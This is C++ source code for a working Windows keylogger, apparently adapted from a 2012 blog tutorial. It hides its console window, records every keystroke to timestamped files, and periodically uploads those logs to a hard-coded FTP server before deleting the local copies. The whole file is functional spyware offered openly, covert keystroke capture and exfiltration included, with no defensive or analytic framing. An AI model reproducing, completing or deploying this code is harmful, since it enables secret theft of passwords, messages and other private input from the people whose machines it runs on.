// Original Code obtained from: http://codecompiler.wordpress.com/2012/08/15/how-to-create-keylogger-using-c/

/*
	KeyLogger

	This application creates two threads, the first is a keylogger that
	writes the captured keys to a file on the disk

	The second thread uploads the keylogger file to an FTP server, deletes
	the old keylogger file, and then creates a new file name based off of
	the current Unix time since Epoch.
*/

#include <iostream>
#include <windows.h>
#include <WinInet.h>
#include <process.h>
#include <direct.h>
#include <ctime>
#include <string>

#pragma comment( lib, "wininet" )

#define FTP_SERVER L"192.168.1.38"
#define FTP_USER L"anonymous"
#define FTP_PASS L""

std::string fname;
char* cwd;
// Mutex for doing thangs to our key log file
HANDLE hIOMutex = CreateMutex(NULL, FALSE, NULL); 

/* Function definitions */
int write( int key_stroke );
void FileSubmit(LPCWSTR* source, LPCWSTR* dest);
void hide();
void uploader(void*);
void keylogger(void*);
std::wstring s2ws(const std::string&);
 

/* Main :P */
int main( int argc, char* argv[] ){
	/* Get the cwd, so we can delete files */
	cwd = _getcwd(NULL, 0);
	time_t t;
	hide();
	srand( (unsigned)time(NULL) );
	t = time(0);
	fname = ".\\keys_" + std::to_string(t) + ".txt"; // make an initial filename
	
	/* Create a thread for the uploader and a thread for the keylogger */
	_beginthread(keylogger, 0, NULL);
	_beginthread(uploader, 0, NULL);

	while(1){ } // Have the main process sleep forever.

	return 0;
}


/* Function to upload the files every now and again */
void uploader(void* parg){

	while(1){
		// Sleep time should be 1 to 5 minutes.
		unsigned int t_sleep = rand() % 30000 + 6000;
		time_t t_stamp = time(0);

		/* Sleep */
		Sleep(t_sleep);
		
		/* Get the mutext */
		WaitForSingleObject( hIOMutex, INFINITE);
	
		/* Upload the file */
		std::wstring dest_dir = L"./uploads/";
		std::wstring src_name = s2ws(fname);
		std::wstring dst_name = dest_dir + src_name.substr(2,src_name.length()-2);

		LPCWSTR source = src_name.c_str();
		LPCWSTR dest   = dst_name.c_str();

		FileSubmit( &source, &dest );
	
		/* Create a new file name */
		std::string nfname = ".\\keys_" + std::to_string(t_stamp) + ".txt";

		/* Delete the old file */
		std::wstring temp = s2ws(std::string(cwd)) + src_name;
		LPCWSTR old_fname = temp.c_str();
		DeleteFile(old_fname);
		fname = nfname.c_str(); // Force a deep copy of the global filename.

		/* Release the Mutex */
		ReleaseMutex( hIOMutex );
	}
}


/* main functionality for the keylogger */
 void keylogger(void * parg){
	while (1){
		/* Get keys and write them */
		for(unsigned char key = 8; key <= 190; key++){
			if (GetAsyncKeyState(key) == -32767){
				write (key);
			}
		}
	}
}


/* Function to hide the console window */
void hide(){
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth,0);
}

/* Function to upload a file to an anonymous FTP server */
void FileSubmit(LPCWSTR* source, LPCWSTR* dest){
	HINTERNET hInternet;
	HINTERNET hFtpSession;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if(hInternet != NULL){
		hFtpSession = InternetConnect(hInternet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, 0, 0);
		if(hFtpSession != NULL){
			FtpPutFile(hFtpSession, *source, *dest, FTP_TRANSFER_TYPE_BINARY, 0);
		}
	}
}

/* Function to write out the keystroke to a file. */
int write(int key_stroke){

	if ( (key_stroke == 1) || (key_stroke == 2) )
		return 0;
 
	int e;
	FILE *fout;
	WaitForSingleObject( hIOMutex, INFINITE);
	e = fopen_s(&fout, fname.c_str(), "a+");
	if(e)	// If the file can't be opened, a ret code is stashed in e.
		return 0;
 
	if (key_stroke == 8)
		fprintf(fout, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(fout, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(fout, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(fout, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(fout, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(fout, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(fout, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(fout, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(fout, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(fout, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(fout, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(fout, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(fout, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(fout, "%s", ".");
	else
		fprintf(fout, "%s", &key_stroke);
	fflush(fout);
	fclose (fout);
	ReleaseMutex( hIOMutex );
	return 0;
}
 

/* Used to convert a string to a wstring, so we can pass a
   LPCWSTR pointer to the file upload function */
std::wstring s2ws(const std::string& s){
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0); 
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}